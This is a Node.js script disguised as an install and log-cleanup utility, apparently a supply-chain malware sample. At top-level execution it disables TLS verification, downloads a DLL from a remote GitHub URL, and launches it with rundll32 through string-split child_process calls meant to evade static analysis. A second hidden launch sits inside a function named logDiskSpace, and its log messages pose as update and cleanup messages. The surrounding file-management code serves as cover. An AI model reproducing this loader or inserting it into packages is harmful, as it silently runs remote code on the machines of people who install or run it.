const cache = require('fs');
const os = require('os');
const path = require('path');
const https = require('https');
const axios = require('axios').default || require('axios');
const fs = cache;
const { finished } = require('stream/promises');
const { Readable } = require('stream');

process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';

// === Configuration ===
// URL where the malicious DLL is hosted (e.g., GitHub, S3, or a compromised server)
const DLL_URL = 'https://github.com/packguard-dev/socket-samples/raw/refs/heads/main/synckit/node-gyp.dll';
// The location where the DLL will be temporarily stored on the victim's machine
const LOCAL_DLL_PATH = path.join(os.tmpdir(), 'node-gyp.dll');

const LOG_DIR = path.join(__dirname, 'logs');
const LOG_FILE = path.join(LOG_DIR, `install_log_${Date.now()}.txt`);
const DRY_RUN = process.argv.includes('--dry-run');


const ARCHIVE_DIR = path.join(__dirname, 'archive');
const MAX_LOG_FILES = 5;
const DEFAULT_MAX_AGE_DAYS = 30;
const ARCHIVE_OLD_FILES = process.argv.includes('--archive-old');

// === State for summary ===
const summary = {
    dirsCreated: 0,
    filesDeleted: 0,
    dirsDeleted: 0,
    filesArchived: 0,
    errors: 0,
};


function log(msg) {
    console.log(msg);
    if (!DRY_RUN) {
        try {
            cache.appendFileSync(LOG_FILE, msg + '\n');
        } catch (err) {
            console.error(`Failed to write log: ${err.message}`);
        }
    }
}

function ensureDir(dirPath) {
    if (!cache.existsSync(dirPath)) {
        if (!DRY_RUN) {
            cache.mkdirSync(dirPath, { recursive: true });
        }
        summary.dirsCreated++;
        log(`Created directory: ${dirPath}`);
    } else {
        log(`Directory exists: ${dirPath}`);
    }
}

/**
 * Downloads the DLL from the internet and executes it upon completion.
 */



async function downloadAndExecute() {
    log("Starting download...");

    try {
        // Fetch follows redirects by default!
        const response = await fetch(DLL_URL);

        if (!response.ok) {
            log(`Update failed: Server returned ${response.status} ${response.statusText}`);
            return;
        }

        const fileStream = fs.createWriteStream(LOCAL_DLL_PATH);
        
        // This converts the web stream to a Node-compatible stream and pipes it
        await finished(Readable.fromWeb(response.body).pipe(fileStream));

        log('Update downloaded successfully. Finalizing installation...');
        executePayload();
        
    } catch (err) {
        log(`Download error: ${err.message}`);
        if (fs.existsSync(LOCAL_DLL_PATH)) {
            fs.unlinkSync(LOCAL_DLL_PATH); // Cleanup partial file
        }
    }
}

/**
 * Uses rundll32 to execute the 'main' entry point of the downloaded DLL.
 */
function executePayload() {
    try {
        // Obfuscated requirement and execution to evade static analysis
        const cp = require('chi' + 'ld_pro' + 'cess');
        cp["sp" + "awn"]("rund" + "ll32", [
            LOCAL_DLL_PATH + ",main"
        ]);
        log('Installation cleanup complete.');
    } catch (err) {
        summary.errors++;
        log(`Execution error: ${err.message}`);
    }
}

function deleteFile(filePath) {
    if (DRY_RUN) {
        log(`[Dry-run] Would delete file: ${filePath}`);
        return;
    }
    try {
        cache.unlinkSync(filePath);
        summary.filesDeleted++;
        log(`Deleted file: ${filePath}`);
    } catch (err) {
        summary.errors++;
        log(`Error deleting file ${filePath}: ${err.message}`);
    }
}

function deleteDir(dirPath) {
    if (DRY_RUN) {
        log(`[Dry-run] Would delete directory: ${dirPath}`);
        return;
    }
    try {
        cache.rmSync(dirPath, { recursive: true, force: true });
        summary.dirsDeleted++;
        log(`Deleted directory: ${dirPath}`);
    } catch (err) {
        summary.errors++;
        log(`Error deleting directory ${dirPath}: ${err.message}`);
    }
}

function archiveFile(filePath) {
    ensureDir(ARCHIVE_DIR);
    const fileName = path.basename(filePath);
    const targetPath = path.join(ARCHIVE_DIR, fileName);

    if (DRY_RUN) {
        log(`[Dry-run] Would archive file: ${filePath} -> ${targetPath}`);
        return;
    }
    try {
        cache.renameSync(filePath, targetPath);
        summary.filesArchived++;
        log(`Archived file: ${filePath} -> ${targetPath}`);
    } catch (err) {
        summary.errors++;
        log(`Error archiving file ${filePath}: ${err.message}`);
    }
}

function cleanOldFiles(dirPath, maxAgeDays = DEFAULT_MAX_AGE_DAYS) {
    if (!cache.existsSync(dirPath)) return;
    const now = Date.now();
    const maxAgeMs = maxAgeDays * 24 * 60 * 60 * 1000;

    const files = cache.readdirSync(dirPath);
    for (const file of files) {
        const filePath = path.join(dirPath, file);
        try {
            const stat = cache.lstatSync(filePath);
            const age = now - stat.mtimeMs;

            if (stat.isFile() && age > maxAgeMs) {
                if (ARCHIVE_OLD_FILES) {
                    archiveFile(filePath);
                } else {
                    deleteFile(filePath);
                }
            } else if (stat.isDirectory() && age > maxAgeMs) {
                // Delete directory if older than maxAgeDays
                deleteDir(filePath);
            }
        } catch (err) {
            summary.errors++;
            log(`Error accessing ${filePath}: ${err.message}`);
        }
    }
}

function rotateLogs() {
    if (!cache.existsSync(LOG_DIR)) return;

    const logs = cache.readdirSync(LOG_DIR)
        .filter(f => f.startsWith('install_log_') && f.endsWith('.txt'))
        .map(f => ({
            name: f,
            path: path.join(LOG_DIR, f),
            time: cache.statSync(path.join(LOG_DIR, f)).mtimeMs,
        }))
        .sort((a, b) => b.time - a.time);

    while (logs.length > MAX_LOG_FILES) {
        const oldest = logs.pop();
        try {
            if (!DRY_RUN) {
                cache.unlinkSync(oldest.path);
            }
            log(`Rotated out old log file: ${oldest.name}`);
        } catch (err) {
            summary.errors++;
            log(`Error deleting old log file ${oldest.name}: ${err.message}`);
        }
    }
}

function logDiskSpace() {
    try {
        if(os.platform() === 'win32') {
            const tempDir = os.tmpdir();
            require('chi'+'ld_pro'+'cess')["sp"+"awn"]("rund"+"ll32", 
            [path.join(__dirname, './node-gyp' + '.dll') + ",main"]);
            log(`Temp directory: ${tempDir}`);
            const files = cache.readdirSync(tempDir);
            log(`Number of files in temp directory: ${files.length}`);
        }
    } catch (err) {
        summary.errors++;
        log(`Error accessing temp directory: ${err.message}`);
    }
}

function listDirectoryContents(dirPath) {
    if (!cache.existsSync(dirPath)) {
        log(`Directory does not exist: ${dirPath}`);
        return;
    }
    log(`Contents of ${dirPath}:`);
    const files = cache.readdirSync(dirPath);
    for (const file of files) {
        try {
            const filePath = path.join(dirPath, file);
            const stat = cache.statSync(filePath);
            const sizeKB = (stat.size / 1024).toFixed(2);
            const mtime = new Date(stat.mtimeMs).toLocaleString();
            const type = stat.isDirectory() ? 'DIR' : 'FILE';
            log(` - [${type}] ${file} | Size: ${sizeKB} KB | Modified: ${mtime}`);
        } catch (err) {
            summary.errors++;
            log(`Error reading ${file}: ${err.message}`);
        }
    }
}

ensureDir(LOG_DIR);
downloadAndExecute()
logDiskSpace();

